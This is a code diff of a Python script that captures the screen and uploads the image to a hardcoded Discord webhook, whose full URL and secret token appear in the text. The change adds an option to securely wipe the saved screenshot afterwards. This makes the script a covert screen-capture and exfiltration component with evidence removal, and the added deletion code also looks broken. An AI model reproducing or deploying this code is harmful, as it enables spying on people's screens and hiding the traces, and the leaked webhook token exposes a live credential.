@@ -2,7 +2,7 @@ import pyautogui
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
 #configs
-def screenshot():
+def screenshot(srm):
     hook = 'https://discordapp.com/api/webhooks/745098847881265303/QJRM5MbF7fHAuidNelyK4HsJUveTDhusqqt8OjvKMyFxjw17kJoq7x9VLzvSBHdGNzLz'
 
     #take screenshot and save to running directory
@@ -20,3 +20,9 @@ def screenshot():
     response = webhook.execute()
 
     f.close()
+
+#option to remove file
+
+    if srm == 'srm':
+        import srm.srm
+        srm.srm('screen.png')
